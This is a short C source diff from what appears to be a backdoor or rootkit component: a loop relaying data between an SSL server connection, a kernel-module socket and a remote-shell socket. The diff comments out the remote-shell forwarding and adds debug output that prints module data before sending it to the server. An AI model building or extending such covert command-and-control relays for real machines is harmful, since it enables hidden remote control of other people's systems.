@@ -226,14 +226,15 @@ int main(int argc, char** argv) {
                 } else if (size == 0) {
                     break;
                 }
-                if (buffer[0] == '!') {
+                //if (buffer[0] == '!') {
                     printf("Wrote %d to kernel module\n", size);
                     write(conn_sock, buffer + 1, size - 1);
-                } else {
-                    printf("Wrote %d to remote shell\n", size);
-                    //Pass message to shell process
-                    write(remote_shell_sock, buffer, size);
-                }
+                //} else {
+                    //printf("Wrote %d to remote shell\n", size);
+                    ////Pass message to shell process
+                    //write(remote_shell_sock, buffer, size);
+                //}
+                memset(buffer, 0, MAX_PAYLOAD);
             }
         }
     } else {
@@ -242,17 +243,24 @@ int main(int argc, char** argv) {
         //Write
         for (;;) {
             int size = read(conn_sock, buffer, MAX_PAYLOAD);
+            printf("Read %d from module\n", size);
             if (size < 0) {
                 perror("read");
                 break;
             } else if (size == 0) {
                 break;
             }
-            if (buffer[0] == '!') {
-                write(remote_shell_sock, buffer, size);
-            } else {
+            //if (buffer[0] == '!') {
+                //printf("Wrote %d to shell from module\n", size);
+                //write(remote_shell_sock, buffer, size);
+            //} else {
+                printf("Wrote %d to server from module \n", size);
+                for (int i = 0 ; i < size; ++i) {
+                    printf("%c", buffer[i]);
+                }
+                printf("\n");
                 SSL_write(ssl, buffer, size);
-            }
+            //}
         }
     }
 
